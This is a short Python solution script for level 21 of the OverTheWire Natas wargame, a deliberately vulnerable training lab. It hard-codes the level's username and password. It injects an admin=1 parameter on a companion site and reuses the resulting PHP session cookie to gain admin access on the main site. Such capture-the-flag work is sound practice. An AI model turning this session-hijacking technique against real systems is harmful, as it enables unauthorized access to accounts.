# Import Library
import requests
import re
from string import *

# Setting variables needed
username = 'natas21'
password = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'

url=f'http://{username}.natas.labs.overthewire.org/'
url2 = f'http://natas21-experimenter.natas.labs.overthewire.org/?debug=true&submit=submit&admin=1'
pw = []
flag = True
characters = ascii_letters + digits

# Connect to natas
session = requests.session()
payloads = {}
cookies = {}

response = session.request('POST',url2, auth=(username,password))
oldSession = response.cookies['PHPSESSID']
print(response.text)

response = session.request('POST', url, auth=(username,password),cookies={'PHPSESSID':oldSession})
print(response.text)

#response2 = session2.request('POST', url2, auth=(username, password),
 #                                data=payloads, cookies=cookies)

#print(''.join(pw))

# Filtering to get a password
result=response.text
#result2 = response2.text
#result = re.findall('Password: (.*)</pre>', response.text)[0]
#print(response.headers)
